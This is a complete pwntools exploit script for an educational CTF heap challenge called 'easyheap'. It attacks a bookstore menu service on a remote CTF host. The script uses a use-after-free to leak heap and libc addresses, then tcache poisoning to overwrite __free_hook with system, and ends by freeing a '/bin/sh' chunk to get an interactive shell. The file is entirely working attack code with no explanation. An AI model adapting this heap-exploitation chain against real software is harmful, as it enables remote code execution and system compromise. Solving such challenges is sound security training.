from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './easyheap'

# p = process("./easyheap")
p = remote("edu-ctf.zoolab.org", 30211)

def add_book(idx, len, name, price):
    p.sendlineafter("--- happy bookstore ---", "1")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Length of name: ", str(len))
    p.sendlineafter("Name: ", name)
    p.sendlineafter("Price: ", str(price))

def delete_book(idx):
    p.sendlineafter("--- happy bookstore ---", "2")
    p.sendlineafter("Which book do you want to delete", str(idx))

def edit_book(idx, name):
    p.sendlineafter("--- happy bookstore ---", "3")
    p.sendlineafter("Which book do you want to edit: ", str(idx))
    p.sendlineafter("Name: ", name)
    p.sendlineafter("Price: ", str(0xdeadbeef))


# leak heap address
add_book(0, 0x10, b"dummy", 0xdeadbeef)
delete_book(0)
p.sendlineafter("--- happy bookstore ---", "4")
p.recvuntil("Index:\t")
heap_base = int(p.recvline(keepends=False)) - 0x10

# leak glibc address
add_book(1, 0x10, b"dummy", 0xdeadbeef)
add_book(2, 0x10, b"dummy", 0xdeadbeef)
add_book(3, 0x410, b"A"*0x410, 0xdeadbeef)
add_book(4, 0x410, b"A"*0x410, 0xdeadbeef)
delete_book(1)
delete_book(2)

add_book(5, 0x28, p64(heap_base + 0x378), 0xdeadbeef)

delete_book(3)

p.sendlineafter("--- happy bookstore ---", "5")
p.sendlineafter("Index: ", "1")
p.recvuntil("Name: ")
main_arena = int(p.recvline(keepends=False)[::-1].hex(), base=16)
libc = main_arena - 0x1ebbe0
_system = libc + 0x55410
__free_hook = libc + 0x1eeb28

# tcache poisoning
edit_book(5, p64(heap_base+0x790)+p64(0xdeadbeef))
delete_book(1)

edit_book(5, p64(__free_hook-8))

add_book(6, 0x28, b'/bin/sh\x00' + p64(_system), 0xdeadbeef)
delete_book(6)

# gdb.attach(p)

p.interactive()
